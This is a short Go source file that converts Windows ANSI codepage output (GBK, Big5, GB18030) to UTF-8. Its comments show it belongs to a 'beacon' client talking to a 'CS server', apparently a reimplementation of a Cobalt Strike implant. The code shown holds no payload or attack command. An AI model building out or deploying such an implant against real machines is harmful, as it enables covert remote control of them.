package packet

import (
	"bytes"
	"errors"
	"golang.org/x/net/html/charset"
	"golang.org/x/text/transform"
	"io"
	"main/sysinfo"
	"unicode/utf8"
)

// it is hard to handle encoding problem
// beacon will send ANSI charset to CS server, then CS server use it to communicate with beacon
// in Chinese Simplified Windows, ANSI charset is 936(GBK), but golang handle all string as utf8
// Windows API have two versions, A/W. 'A' means use ANSI charset, and 'W' means use wide char(unicode)
// CreateProcess is a marco for CreateProcessA/W, which will be determined at compile time
// but in golang windows package, it simply calls CreateProcessW to keep consistent with utf8

var codepageMap = map[uint32]string{
	936:   "gbk", // gb2312
	950:   "big5",
	54936: "gb18030",
	65001: "utf8",
}

func codepageToUTF8(b []byte) ([]byte, error) {
	// if is not utf8
	if !utf8.Valid(b) {
		transformer, _ := charset.Lookup(codepageMap[sysinfo.ANSICodePage])
		if transformer == nil {
			return nil, errors.New("unknown codepage")
		}
		reader := transform.NewReader(bytes.NewReader(b), transformer.NewDecoder())
		result, err := io.ReadAll(reader)
		if err != nil {
			return nil, err
		}
		return result, nil
	}
	return b, nil
}
